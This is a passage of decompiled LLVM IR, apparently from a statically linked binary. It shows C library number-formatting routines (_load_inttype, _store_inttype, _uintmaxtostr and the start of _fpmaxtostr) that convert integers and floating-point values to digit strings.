  ret i32 %v0_8055ad1

; uselistorder directives
  uselistorder i32 %v0_8055ac3, { 1, 0 }
  uselistorder i32 %v1_8055a86, { 1, 0, 2 }
  uselistorder i32 %v0_8055a98, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8055a3c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055a30, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 12, 4, 7, 6, 13, 5, 2, 3, 10, 9, 1, 11, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055ad1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055ab9, { 1, 0 }
  uselistorder label %dec_label_pc_8055a4f, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8055ad8 = icmp slt i32 %tmp5, 0
  %v3_8055b09 = and i32 %tmp4, 2048
  %v4_8055b09 = icmp eq i32 %v3_8055b09, 0
  br i1 %v5_8055ad8, label %dec_label_pc_8055b09, label %dec_label_pc_8055ae7

dec_label_pc_8055ae7:                             ; preds = %entry
  %v1_8055aea = icmp eq i1 %v4_8055b09, false
  br i1 %v1_8055aea, label %dec_label_pc_8055b0e, label %dec_label_pc_8055aec

dec_label_pc_8055aec:                             ; preds = %dec_label_pc_8055ae7
  %v6_8055aec = icmp eq i32 %tmp4, 256
  %v1_8055af2 = inttoptr i32 %tmp to i32*
  %v2_8055af2 = load i32, i32* %v1_8055af2, align 4
  %v1_8055af4 = icmp eq i1 %v6_8055aec, false
  br i1 %v1_8055af4, label %dec_label_pc_8055afb, label %dec_label_pc_8055af6

dec_label_pc_8055af6:                             ; preds = %dec_label_pc_8055aec
  %v1_8055af6 = urem i32 %v2_8055af2, 256
  br label %dec_label_pc_8055b06

dec_label_pc_8055afb:                             ; preds = %dec_label_pc_8055aec
  %v6_8055afb = icmp eq i32 %tmp4, 512
  %v1_8055b01 = icmp eq i1 %v6_8055afb, false
  br i1 %v1_8055b01, label %dec_label_pc_8055b06, label %dec_label_pc_8055b03

dec_label_pc_8055b03:                             ; preds = %dec_label_pc_8055afb
  %v1_8055b03 = urem i32 %v2_8055af2, 65536
  br label %dec_label_pc_8055b06

dec_label_pc_8055b06:                             ; preds = %dec_label_pc_8055afb, %dec_label_pc_8055af6, %dec_label_pc_8055b03
  %v0_8055b08 = phi i32 [ %v2_8055af2, %dec_label_pc_8055afb ], [ %v1_8055af6, %dec_label_pc_8055af6 ], [ %v1_8055b03, %dec_label_pc_8055b03 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055b08

dec_label_pc_8055b09:                             ; preds = %entry
  br i1 %v4_8055b09, label %dec_label_pc_8055b14, label %dec_label_pc_8055b0e

dec_label_pc_8055b0e:                             ; preds = %dec_label_pc_8055b09, %dec_label_pc_8055ae7
  %v1_8055b0e = add i32 %tmp, 4
  %v2_8055b0e = inttoptr i32 %v1_8055b0e to i32*
  %v3_8055b0e = load i32, i32* %v2_8055b0e, align 4
  store i32 %v3_8055b0e, i32* @edx, align 4
  %v1_8055b11 = inttoptr i32 %tmp to i32*
  %v2_8055b11 = load i32, i32* %v1_8055b11, align 4
  ret i32 %v2_8055b11

dec_label_pc_8055b14:                             ; preds = %dec_label_pc_8055b09
  %v6_8055b14 = icmp eq i32 %tmp4, 256
  %v1_8055b1a = inttoptr i32 %tmp to i32*
  %v2_8055b1a = load i32, i32* %v1_8055b1a, align 4
  %v1_8055b1c = icmp eq i1 %v6_8055b14, false
  br i1 %v1_8055b1c, label %dec_label_pc_8055b23, label %dec_label_pc_8055b1e

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055b14
  %v1_8055b1e = mul i32 %v2_8055b1a, 16777216
  %v2_8055b1e = sdiv i32 %v1_8055b1e, 16777216
  br label %dec_label_pc_8055b2c

dec_label_pc_8055b23:                             ; preds = %dec_label_pc_8055b14
  %v6_8055b23 = icmp eq i32 %tmp4, 512
  %v1_8055b29 = icmp eq i1 %v6_8055b23, false
  br i1 %v1_8055b29, label %dec_label_pc_8055b2c, label %dec_label_pc_8055b2b

dec_label_pc_8055b2b:                             ; preds = %dec_label_pc_8055b23
  %v1_8055b2b = mul i32 %v2_8055b1a, 65536
  %v2_8055b2b = sdiv i32 %v1_8055b2b, 65536
  br label %dec_label_pc_8055b2c

dec_label_pc_8055b2c:                             ; preds = %dec_label_pc_8055b23, %dec_label_pc_8055b1e, %dec_label_pc_8055b2b
  %v0_8055b2c = phi i32 [ %v2_8055b1a, %dec_label_pc_8055b23 ], [ %v2_8055b1e, %dec_label_pc_8055b1e ], [ %v2_8055b2b, %dec_label_pc_8055b2b ]
  %v1_8055b2c = ashr i32 %v0_8055b2c, 31
  store i32 %v1_8055b2c, i32* @edx, align 4
  ret i32 %v0_8055b2c

; uselistorder directives
  uselistorder i32 %v0_8055b2c, { 1, 0 }
  uselistorder i32 %v2_8055b1a, { 2, 0, 1 }
  uselistorder i32 %v2_8055af2, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055b2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055b06, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055b30 = load i32, i32* @ebx, align 4
  store i32 %v0_8055b30, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055b35 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055b35, i32* %ebx.global-to-local, align 4
  %v4_8055b39 = trunc i32 %tmp4 to i16
  %v6_8055b41 = icmp eq i32 %tmp6, 256
  %v1_8055b47 = icmp eq i1 %v6_8055b41, false
  br i1 %v1_8055b47, label %dec_label_pc_8055b4d, label %dec_label_pc_8055b49

dec_label_pc_8055b49:                             ; preds = %entry
  %v2_8055b49 = trunc i32 %tmp4 to i8
  %v4_8055b49 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055b49, i8* %v4_8055b49, align 1
  br label %dec_label_pc_8055b6b

dec_label_pc_8055b4d:                             ; preds = %entry
  %v6_8055b4d = icmp eq i32 %tmp6, 2048
  %v1_8055b53 = icmp eq i1 %v6_8055b4d, false
  br i1 %v1_8055b53, label %dec_label_pc_8055b5c, label %dec_label_pc_8055b55

dec_label_pc_8055b55:                             ; preds = %dec_label_pc_8055b4d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8055b55 = sdiv i32 %sext2, 65536
  %v3_8055b55 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055b55, i32* %v3_8055b55, align 4
  %v0_8055b57 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055b57 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055b57 = add i32 %v1_8055b57, 4
  %v3_8055b57 = inttoptr i32 %v2_8055b57 to i32*
  store i32 %v0_8055b57, i32* %v3_8055b57, align 4
  br label %dec_label_pc_8055b6b

dec_label_pc_8055b5c:                             ; preds = %dec_label_pc_8055b4d
  %v6_8055b5c = icmp eq i32 %tmp6, 512
  %v1_8055b62 = icmp eq i1 %v6_8055b5c, false
  br i1 %v1_8055b62, label %dec_label_pc_8055b69, label %dec_label_pc_8055b64

dec_label_pc_8055b64:                             ; preds = %dec_label_pc_8055b5c
  store i16 %v4_8055b39, i16* %tmp5, align 2
  br label %dec_label_pc_8055b6b

dec_label_pc_8055b69:                             ; preds = %dec_label_pc_8055b5c
  %sext3 = mul i32 %tmp4, 65536
  %v1_8055b69 = sdiv i32 %sext3, 65536
  %v3_8055b69 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055b69, i32* %v3_8055b69, align 4
  br label %dec_label_pc_8055b6b

dec_label_pc_8055b6b:                             ; preds = %dec_label_pc_8055b64, %dec_label_pc_8055b55, %dec_label_pc_8055b49, %dec_label_pc_8055b69
  %v2_8055b6b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055b6b, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8055b6c = sdiv i32 %sext, 65536
  ret i32 %v1_8055b6c

; uselistorder directives
  uselistorder label %dec_label_pc_8055b6b, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8055b7b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b7b, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8055b87 = icmp slt i32 %arg4, 0
  %v1_8055b89 = icmp eq i1 %v2_8055b87, false
  br i1 %v1_8055b89, label %dec_label_pc_8055baa, label %dec_label_pc_8055b8b

dec_label_pc_8055b8b:                             ; preds = %entry
  %v1_8055b8b = sub i32 0, %arg4
  store i32 %v1_8055b8b, i32* %esi.global-to-local, align 4
  %v2_8055b8d = icmp slt i32 %arg3, 0
  %v1_8055b8f = icmp eq i1 %v2_8055b8d, false
  br i1 %v1_8055b8f, label %dec_label_pc_8055baa, label %dec_label_pc_8055b91

dec_label_pc_8055b91:                             ; preds = %dec_label_pc_8055b8b
  %v1_8055b91 = sub i32 0, %arg2
  %v5_8055b91 = icmp ne i32 %arg2, 0
  store i32 %v1_8055b91, i32* %ecx.global-to-local, align 4
  %v2_8055b93 = zext i1 %v5_8055b91 to i32
  %v3_8055b93 = add i32 %v2_8055b93, %arg3
  %v1_8055b96 = sub i32 0, %v3_8055b93
  store i32 %v1_8055b96, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055baa

dec_label_pc_8055baa:                             ; preds = %entry, %dec_label_pc_8055b8b, %dec_label_pc_8055b91
  %v0_8055baf = phi i32 [ %v1_8055b8b, %dec_label_pc_8055b91 ], [ %v1_8055b8b, %dec_label_pc_8055b8b ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8055b91 ], [ 0, %dec_label_pc_8055b8b ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8055baf
  %tmp30 = urem i32 -1, %v0_8055baf
  store i8 0, i8* %arg1, align 1
  %v1_8055bb4 = add i32 %tmp30, 1
  %v1_8055bb5 = load i32, i32* %esi.global-to-local, align 4
  %v12_8055bb5 = icmp eq i32 %v1_8055bb4, %v1_8055bb5
  %v1_8055bbf = icmp eq i1 %v12_8055bb5, false
  br i1 %v1_8055bbf, label %dec_label_pc_8055bce, label %dec_label_pc_8055bc1

dec_label_pc_8055bc1:                             ; preds = %dec_label_pc_8055baa
  %v1_8055bc1 = add i32 %div, 1
  br label %dec_label_pc_8055bce

dec_label_pc_8055bce:                             ; preds = %dec_label_pc_8055baa, %dec_label_pc_8055bc1
  %stack_var_-20.0.off0 = phi i32 [ %v1_8055bb4, %dec_label_pc_8055baa ], [ 0, %dec_label_pc_8055bc1 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8055baa ], [ %v1_8055bc1, %dec_label_pc_8055bc1 ]
  %v0_8055bce = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055bce, i32* %ebp.global-to-local, align 4
  %v0_8055bd0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055bd0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055bd4

dec_label_pc_8055bd4:                             ; preds = %dec_label_pc_8055c22, %dec_label_pc_8055bce
  %v0_8055c0b = phi i32 [ %v0_8055c24, %dec_label_pc_8055c22 ], [ %v0_8055bce, %dec_label_pc_8055bce ]
  %v0_8055bd8 = phi i32 [ %v1_8055c26, %dec_label_pc_8055c22 ], [ %v0_8055bd0, %dec_label_pc_8055bce ]
  %v1_8055bd4 = icmp eq i32 %v0_8055bd8, 0
  br i1 %v1_8055bd4, label %dec_label_pc_8055c0b, label %dec_label_pc_8055bd8

dec_label_pc_8055bd8:                             ; preds = %dec_label_pc_8055bd4
  %v0_8055bdc = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_8055bd8, %v0_8055bdc
  %tmp31 = urem i32 %v0_8055bd8, %v0_8055bdc
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8055c0b, %v0_8055bdc
  %tmp32 = urem i32 %v0_8055c0b, %v0_8055bdc
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8055bef = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_8055bf3 = add i32 %tmp32, %v6_8055bef
  %v8_8055bf9 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8055bfe = add i32 %div7, %v8_8055bf9
  store i32 %v2_8055bfe, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_8055bf3, %v0_8055bdc
  %tmp33 = urem i32 %v2_8055bf3, %v0_8055bdc
  %v2_8055c06 = add i32 %div8, %v2_8055bfe
  br label %dec_label_pc_8055c13

dec_label_pc_8055c0b:                             ; preds = %dec_label_pc_8055bd4
  %v0_8055c0f = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8055c0b, %v0_8055c0f
  %tmp34 = urem i32 %v0_8055c0b, %v0_8055c0f
  br label %dec_label_pc_8055c13

dec_label_pc_8055c13:                             ; preds = %dec_label_pc_8055bd8, %dec_label_pc_8055c0b
  %v13_8055c19 = phi i32 [ %tmp33, %dec_label_pc_8055bd8 ], [ %tmp34, %dec_label_pc_8055c0b ]
  %storemerge = phi i32 [ %v2_8055c06, %dec_label_pc_8055bd8 ], [ %div10, %dec_label_pc_8055c0b ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055c13 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055c13 = add i32 %v0_8055c13, -1
  store i32 %v1_8055c13, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8055c19, 10
  br i1 %tmp, label %dec_label_pc_8055c19, label %dec_label_pc_8055c1e

dec_label_pc_8055c19:                             ; preds = %dec_label_pc_8055c13
  %v2_8055c19 = add i32 %v13_8055c19, 48
  %v12_8055c19 = and i32 %v2_8055c19, 255
  %v14_8055c19 = and i32 %v13_8055c19, -256
  %v15_8055c19 = or i32 %v12_8055c19, %v14_8055c19
  br label %dec_label_pc_8055c22

dec_label_pc_8055c1e:                             ; preds = %dec_label_pc_8055c13
  %v6_8055c1e = add i32 %v13_8055c19, %arg5
  %v21_8055c1e = and i32 %v6_8055c1e, 255
  %v23_8055c1e = and i32 %v13_8055c19, -256
  %v24_8055c1e = or i32 %v21_8055c1e, %v23_8055c1e
  br label %dec_label_pc_8055c22

dec_label_pc_8055c22:                             ; preds = %dec_label_pc_8055c19, %dec_label_pc_8055c1e
  %storemerge9 = phi i32 [ %v15_8055c19, %dec_label_pc_8055c19 ], [ %v24_8055c1e, %dec_label_pc_8055c1e ]
  %v1_8055c22 = trunc i32 %storemerge9 to i8
  %v3_8055c22 = inttoptr i32 %v1_8055c13 to i8*
  store i8 %v1_8055c22, i8* %v3_8055c22, align 1
  %v0_8055c24 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c26 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055c26 = or i32 %v1_8055c26, %v0_8055c24
  %v3_8055c26 = icmp eq i32 %v2_8055c26, 0
  %v1_8055c28 = icmp eq i1 %v3_8055c26, false
  br i1 %v1_8055c28, label %dec_label_pc_8055bd4, label %dec_label_pc_8055c2a

dec_label_pc_8055c2a:                             ; preds = %dec_label_pc_8055c22
  %v4_8055c2a = icmp eq i32 %storemerge11, 0
  br i1 %v4_8055c2a, label %dec_label_pc_8055c35, label %dec_label_pc_8055c31

dec_label_pc_8055c31:                             ; preds = %dec_label_pc_8055c2a
  %v0_8055c31 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055c31 = add i32 %v0_8055c31, -1
  store i32 %v1_8055c31, i32* %edi.global-to-local, align 4
  %v1_8055c32 = inttoptr i32 %v1_8055c31 to i8*
  store i8 45, i8* %v1_8055c32, align 1
  br label %dec_label_pc_8055c35

dec_label_pc_8055c35:                             ; preds = %dec_label_pc_8055c2a, %dec_label_pc_8055c31
  %v0_8055c38 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055c38

; uselistorder directives
  uselistorder i32 %v13_8055c19, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8055bf3, { 1, 0 }
  uselistorder i32 %v0_8055bdc, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8055bd8, { 1, 0, 2 }
  uselistorder i32 %v0_8055c0b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8055bb4, { 1, 0 }
  uselistorder i32 %v0_8055baf, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055c35, { 1, 0 }
  uselistorder label %dec_label_pc_8055c22, { 1, 0 }
  uselistorder label %dec_label_pc_8055c13, { 1, 0 }
  uselistorder label %dec_label_pc_8055bce, { 1, 0 }
  uselistorder label %dec_label_pc_8055baa, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055c41 = load i32, i32* @edi, align 4
  %v0_8055c42 = load i32, i32* @esi, align 4
  %v0_8055c43 = load i32, i32* @ebx, align 4
  store i32 %v0_8055c43, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8055c58 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8055c58 = add i3 %v4_8055c58, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8055c58, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055c5f = add i32 %tmp156, 4
  %v2_8055c5f = inttoptr i32 %v1_8055c5f to i32*
  %v3_8055c5f = load i32, i32* %v2_8055c5f, align 4
  store i32 %v3_8055c5f, i32* %eax.global-to-local, align 4
  %v1_8055c66 = add i32 %tmp156, 8
  %v2_8055c66 = inttoptr i32 %v1_8055c66 to i8*
  %v3_8055c66 = load i8, i8* %v2_8055c66, align 1
  %v4_8055c66 = zext i8 %v3_8055c66 to i32
  %v6_8055c66 = and i32 %v0_8055c43, -256
  %v7_8055c66 = or i32 %v4_8055c66, %v6_8055c66
  store i32 %v7_8055c66, i32* %ebx.global-to-local, align 4
  %v1_8055c69 = inttoptr i32 %tmp156 to i32*
  %v2_8055c69 = load i32, i32* %v1_8055c69, align 4
  store i32 %v2_8055c69, i32* %ebp.global-to-local, align 4
  %v2_8055c75 = or i8 %v3_8055c66, 32
  %v7_8055c75 = zext i8 %v2_8055c75 to i32
  %v9_8055c75 = and i32 %v3_8055c5f, -256
  %v10_8055c75 = or i32 %v7_8055c75, %v9_8055c75
  store i32 %v10_8055c75, i32* %eax.global-to-local, align 4
  %v10_8055c77 = icmp eq i8 %v2_8055c75, 97
  %v1_8055c7d = icmp eq i1 %v10_8055c77, false
  br i1 %v1_8055c7d, label %dec_label_pc_8055c86, label %dec_label_pc_8055c7f

dec_label_pc_8055c7f:                             ; preds = %entry
  %v2_8055c7f = add i8 %v3_8055c66, 6
  %v15_8055c7f = zext i8 %v2_8055c7f to i32
  %v18_8055c7f = or i32 %v15_8055c7f, %v6_8055c66
  store i32 %v18_8055c7f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055c86

dec_label_pc_8055c86:                             ; preds = %entry, %dec_label_pc_8055c7f
  %stack_var_-207.0 = phi i8 [ %v3_8055c66, %entry ], [ %v2_8055c7f, %dec_label_pc_8055c7f ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8055c8d = icmp slt i32 %v2_8055c69, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8055c9c = select i1 %v2_8055c8d, i32 6, i32 %v2_8055c69
  store i32 %v3_8055c9c, i32* %ebp.global-to-local, align 4
  %v1_8055c9f = add i32 %tmp156, 12
  %v2_8055c9f = inttoptr i32 %v1_8055c9f to i32*
  %v3_8055c9f = load i32, i32* %v2_8055c9f, align 4
  store i32 %v3_8055c9f, i32* %eax.global-to-local, align 4
  %v2_8055ca2 = and i32 %v3_8055c9f, 2
  %v3_8055ca2 = icmp eq i32 %v2_8055ca2, 0
  br i1 %v3_8055ca2, label %dec_label_pc_8055cb0, label %dec_label_pc_8055cbc

dec_label_pc_8055cb0:                             ; preds = %dec_label_pc_8055c86
  %v2_8055cb0 = urem i32 %v3_8055c9f, 2
  %tmp192 = trunc i32 %v2_8055cb0 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8055cbc

dec_label_pc_8055cbc:                             ; preds = %dec_label_pc_8055cb0, %dec_label_pc_8055c86
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8055c86 ], [ %tmp193, %dec_label_pc_8055cb0 ]
  %not.v5_8055cbc = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8055cbc, label %dec_label_pc_8055d33, label %dec_label_pc_8055cde

dec_label_pc_8055cde:                             ; preds = %dec_label_pc_8055cbc
  %v1_8055cde = add i3 %v4_8055c58, -2
  store i3 %v1_8055cde, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8055ce2 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8055ce2, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8055cde
  br label %dec_label_pc_8055d6e

bb180:                                            ; preds = %dec_label_pc_8055cde
  %v5_8055ce2 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8055ce2, label %bb181, label %dec_label_pc_8055ce6

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8055d6e

dec_label_pc_8055ce6:                             ; preds = %bb180
  %not.v4_8055ce0 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8055ce0, label %dec_label_pc_8055d6e, label %dec_label_pc_8055e03

dec_label_pc_8055d33:                             ; preds = %dec_label_pc_8055cbc
  store i3 %v4_8055c58, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8055d3a = add i32 %tmp156, 16
  %v2_8055d3a = inttoptr i32 %v1_8055d3a to i32*
  store i32 32, i32* %v2_8055d3a, align 4
  %v4_8055d41 = add i8 %stack_var_-207.0, -96
  %v6_8055d41 = sub i8 95, %stack_var_-207.0
  %v7_8055d41 = and i8 %v6_8055d41, %stack_var_-207.0
  %v8_8055d41 = icmp slt i8 %v7_8055d41, 0
  %v9_8055d41 = icmp eq i8 %v4_8055d41, 0
  %v10_8055d41 = icmp slt i8 %v4_8055d41, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8055d56 = icmp eq i1 %v10_8055d41, %v8_8055d41
  %v4_8055d56 = icmp eq i1 %v9_8055d41, false
  %v5_8055d56 = and i1 %v4_8055d56, %v3_8055d56
  br i1 %v5_8055d56, label %dec_label_pc_8055d5d, label %dec_label_pc_8055d58

dec_label_pc_8055d58:                             ; preds = %dec_label_pc_8055d33
  br label %dec_label_pc_8055d5d

dec_label_pc_8055d5d:                             ; preds = %dec_label_pc_8055d33, %dec_label_pc_8055d58
  %v2_8055d65 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8055d65, i32* @ecx, align 4
  br label %dec_label_pc_805612e

dec_label_pc_8055d6e:                             ; preds = %dec_label_pc_8055ce6, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8055d88 = xor i3 %v4_8055c58, -4
  store i3 %v3_8055d88, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8055d8e

dec_label_pc_8055d8e:                             ; preds = %dec_label_pc_8055ddf, %dec_label_pc_8055d6e
  %v0_8055ddf = phi i32 [ 4096, %dec_label_pc_8055d6e ], [ %v2_8055ddf, %dec_label_pc_8055ddf ]
  %v2_8055d91 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8055d6e ], [ %v2_8055d9181, %dec_label_pc_8055ddf ]
  %v1_8055dc9 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8055d6e ], [ %v0_8055d8e79, %dec_label_pc_8055ddf ]
  %v0_8055ddb66 = phi i32 [ 13, %dec_label_pc_8055d6e ], [ %v1_8055d90, %dec_label_pc_8055ddf ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8055d6e ], [ %stack_var_-220.1, %dec_label_pc_8055ddf ]
  %v1_8055d90 = add i32 %v0_8055ddb66, -1
  %v4_8055d91 = fcmp ule x86_fp80 %v1_8055dc9, %v2_8055d91
  br i1 %v4_8055d91, label %dec_label_pc_8055db8, label %dec_label_pc_8055d95

dec_label_pc_8055d95:                             ; preds = %dec_label_pc_8055d8e
  store x86_fp80 %v1_8055dc9, x86_fp80* %st0.global-to-local, align 4
  %v3_8055d97 = mul i32 %v1_8055d90, 12
  store i32 %v3_8055d97, i32* %eax.global-to-local, align 4
  %v1_8055d9a = add i32 %v3_8055d97, ptrtoint (x86_fp80** @global_var_805b440.554 to i32)
  %v2_8055d9a = inttoptr i32 %v1_8055d9a to x86_fp80*
  %v3_8055d9a = load x86_fp80, x86_fp80* %v2_8055d9a, align 4
  %v4_8055da0 = fmul x86_fp80 %v1_8055dc9, %v3_8055d9a
  store x86_fp80 %v4_8055da0, x86_fp80* %st1.global-to-local, align 4
  %v4_8055da4 = fcmp ule x86_fp80 %v4_8055da0, %v3_8055d9a
  br i1 %v4_8055da4, label %dec_label_pc_8055dd9, label %dec_label_pc_8055da8

dec_label_pc_8055da8:                             ; preds = %dec_label_pc_8055d95
  store x86_fp80 %v4_8055da0, x86_fp80* %st1.global-to-local, align 4
  %v5_8055db2 = sub i32 %stack_var_-220.0, %v0_8055ddf
  br label %dec_label_pc_8055ddb

dec_label_pc_8055db8:                             ; preds = %dec_label_pc_8055d8e
  %v3_8055db8 = mul i32 %v1_8055d90, 12
  store i32 %v3_8055db8, i32* %eax.global-to-local, align 4
  %v1_8055dbb = add i32 %v3_8055db8, ptrtoint (x86_fp80** @global_var_805b440.554 to i32)
  %v2_8055dbb = inttoptr i32 %v1_8055dbb to x86_fp80*
  %v3_8055dbb = load x86_fp80, x86_fp80* %v2_8055dbb, align 4
  %v4_8055dc1 = fdiv x86_fp80 %v3_8055dbb, %v1_8055dc9
  store x86_fp80 %v4_8055dc1, x86_fp80* %st1.global-to-local, align 4
  %v4_8055dc3 = fcmp ogt x86_fp80 %v3_8055dbb, %v1_8055dc9
  br i1 %v4_8055dc3, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8055db8
  store x86_fp80 %v3_8055dbb, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8055dc9

bb183:                                            ; preds = %dec_label_pc_8055db8
  %v5_8055dc3 = fcmp olt x86_fp80 %v3_8055dbb, %v1_8055dc9
  br i1 %v5_8055dc3, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
